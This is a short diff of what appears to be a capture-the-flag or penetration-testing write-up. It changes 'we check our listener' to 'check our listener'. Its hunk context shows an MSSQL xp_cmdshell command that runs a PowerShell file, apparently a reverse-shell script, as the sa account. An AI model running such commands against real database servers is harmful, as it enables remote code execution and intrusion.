@@ -508,7 +508,7 @@ SQL (sa  dbo@master)> xp_cmdshell "powershell -File C:\Users\sql_svc\Desktop\rev
 
 <br />
 
-Finally, we check our listener:
+Finally, check our listener:
 
 <br />
 
